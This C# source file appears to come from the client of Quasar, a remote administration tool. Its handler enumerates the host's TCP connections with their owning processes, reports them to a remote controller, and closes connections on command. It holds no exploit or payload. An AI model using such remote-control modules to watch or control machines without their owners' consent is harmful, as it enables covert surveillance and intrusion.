using Quasar.Common;
using System;
using System.Runtime.InteropServices;

namespace Quasar.Client.Messages
{
    public class TcpConnectionsHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetConnections ||
                                                    message is DoCloseConnection;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetConnections msg:
                    Execute(sender, msg);
                    break;
                case DoCloseConnection msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetConnections message)
        {
            var table = GetTable();

            var connections = new TcpConnection[table.Length];

            for (int i = 0; i < table.Length; i++)
            {
                string processName;
                try
                {
                    var p = System.Diagnostics.Process.GetProcessById((int)table[i].owningPid);
                    processName = p.ProcessName;
                }
                catch
                {
                    processName = $"PID: {table[i].owningPid}";
                }

                connections[i] = new TcpConnection
                {
                    ProcessName = processName,
                    LocalAddress = table[i].LocalAddress.ToString(),
                    LocalPort = table[i].LocalPort,
                    RemoteAddress = table[i].RemoteAddress.ToString(),
                    RemotePort = table[i].RemotePort,
                    State = (ConnectionState)table[i].state
                };
            }

            client.Send(new GetConnectionsResponse { Connections = connections });
        }

        private void Execute(ISender client, DoCloseConnection message)
        {
            var table = GetTable();

            for (var i = 0; i < table.Length; i++)
            {
                //search for connection
                if (message.LocalAddress == table[i].LocalAddress.ToString() &&
                    message.LocalPort == table[i].LocalPort &&
                    message.RemoteAddress == table[i].RemoteAddress.ToString() &&
                    message.RemotePort == table[i].RemotePort)
                {
                    // it will close the connection only if client run as admin
                    table[i].state = (byte)ConnectionState.Delete_TCB;
                    var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                    Marshal.StructureToPtr(table[i], ptr, false);
                    Win32.SetTcpEntry(ptr);
                    Execute(client, new GetConnections());
                    return;
                }
            }
        }

        private Win32.MibTcprowOwnerPid[] GetTable()
        {
            Win32.MibTcprowOwnerPid[] tTable;
            var afInet = 2;
            var buffSize = 0;
            // retrieve correct pTcpTable size
            Win32.GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, afInet, Win32.TcpTableClass.TcpTableOwnerPidAll);
            var buffTable = Marshal.AllocHGlobal(buffSize);
            try
            {
                var ret = Win32.GetExtendedTcpTable(buffTable, ref buffSize, true, afInet, Win32.TcpTableClass.TcpTableOwnerPidAll);
                if (ret != 0)
                    return null;
                var tab = (Win32.MibTcptableOwnerPid)Marshal.PtrToStructure(buffTable, typeof(Win32.MibTcptableOwnerPid));
                var rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
                tTable = new Win32.MibTcprowOwnerPid[tab.dwNumEntries];
                for (var i = 0; i < tab.dwNumEntries; i++)
                {
                    var tcpRow = (Win32.MibTcprowOwnerPid)Marshal.PtrToStructure(rowPtr, typeof(Win32.MibTcprowOwnerPid));
                    tTable[i] = tcpRow;
                    rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }
            return tTable;
        }
    }
}
